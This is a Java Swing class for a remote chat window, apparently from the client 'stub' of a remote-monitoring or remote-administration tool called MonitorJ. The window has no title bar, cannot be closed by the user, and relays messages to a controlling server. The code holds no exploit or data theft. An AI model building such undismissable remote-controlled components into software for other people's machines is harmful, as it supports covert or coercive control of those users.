package me.jershdervis.monitorj.stub.ui;

import me.jershdervis.monitorj.stub.MonitorJStub;
import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.util.ClientSystemUtil;

import javax.swing.*;
import java.io.IOException;
import java.io.UTFDataFormatException;

/**
 * Created by Josh on 20/06/2015.
 */
public class RemoteChatWindow extends JFrame {

    private javax.swing.JButton btnSend;
    public javax.swing.JList chatBoxList;
    public javax.swing.DefaultListModel<String> chatBoxModel = new DefaultListModel<String>();
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextField messageField;

    public RemoteChatWindow() {
        this.initComponents();
    }

    private void initComponents() {
        btnSend = new javax.swing.JButton();
        messageField = new javax.swing.JTextField();
        jScrollPane1 = new javax.swing.JScrollPane();
        chatBoxList = new javax.swing.JList(chatBoxModel);

        setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);

        setUndecorated(true);

        btnSend.setText("Send");
        btnSend.addActionListener(evt -> this.sendMessage());

        messageField.addActionListener(e -> this.sendMessage());

        jScrollPane1.setViewportView(chatBoxList);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
                layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addGroup(layout.createSequentialGroup()
                                .addContainerGap()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                        .addComponent(jScrollPane1)
                                        .addGroup(layout.createSequentialGroup()
                                                .addComponent(messageField, javax.swing.GroupLayout.PREFERRED_SIZE, 305, javax.swing.GroupLayout.PREFERRED_SIZE)
                                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                                .addComponent(btnSend, javax.swing.GroupLayout.PREFERRED_SIZE, 69, javax.swing.GroupLayout.PREFERRED_SIZE)
                                                .addGap(0, 0, Short.MAX_VALUE)))
                                .addContainerGap())
        );
        layout.setVerticalGroup(
                layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                                .addContainerGap()
                                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 249, Short.MAX_VALUE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                        .addComponent(btnSend)
                                        .addComponent(messageField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addContainerGap())
        );

        pack();
    }

    private void sendMessage() {
        BaseClient serverClientConnection = MonitorJStub.getInstance().getClientServerConnection();
        try {
            serverClientConnection.getDataOutputStream().writeByte(Packets.REMOTE_CHAT_MESSAGE.getPacketID());
            serverClientConnection.getDataOutputStream().writeUTF(messageField.getText());
            this.chatBoxModel.addElement(ClientSystemUtil.getUsername() + ": " + messageField.getText());
            this.chatBoxList.ensureIndexIsVisible(chatBoxModel.getSize() - 1);
            this.messageField.setText("");
        } catch (UTFDataFormatException toMuch) {
            this.messageField.setText("");
            JOptionPane.showMessageDialog(null, "Message is too large", "Long message", JOptionPane.ERROR_MESSAGE);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
